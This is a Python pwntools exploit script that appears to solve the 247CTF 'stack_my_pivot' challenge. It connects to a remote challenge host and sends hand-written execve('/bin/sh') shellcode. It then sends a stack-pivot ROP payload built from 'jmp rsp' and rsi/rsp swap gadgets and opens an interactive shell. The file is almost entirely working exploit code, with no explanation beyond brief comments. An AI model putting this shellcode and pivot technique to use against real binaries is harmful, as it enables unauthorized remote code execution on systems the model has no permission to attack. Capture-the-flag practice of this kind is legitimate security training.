
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./stack_my_pivot --host 866e421af4e2b022.247ctf.com --port 50086
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./stack_my_pivot')
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
#tcp://38b033533e1f53e8.247ctf.com:50236
host = args.HOST or 'f4dc688e005dbc82.247ctf.com'
port = int(args.PORT or 50122)

context.terminal = ['tmux', 'splitw', '-h']

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

rsi_offset = 0
rip_offset = 24
jmp_rsp = 0x400738 #jmp rsp gadget

gadget = 0x400732  # exch rsi, rsp; pop rbp; ret
io = start()

def send_shellcode():
    shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05" #shellcraft.sh() has invalid chars

    log.info("sending shellcode")
    io.sendline(shellcode)

def send_payload():
    payload = 8 * b'\x90' #The pop rbp adds 8 to rsp so this instruction is ignored
    payload += p64(jmp_rsp) #Jmp rsp gadget which allows us to execute code
    payload += asm("sub rsp,0x50; jmp rsp; nop; nop")
    payload += p64(gadget) # exch rsi, rsp; pop rbp; ret

    log.info("sending payload")
    io.sendline(payload)

log.info(io.recvline())
log.info(io.recvline())

send_shellcode()
log.info(io.recvline())

send_payload()
io.interactive()
```
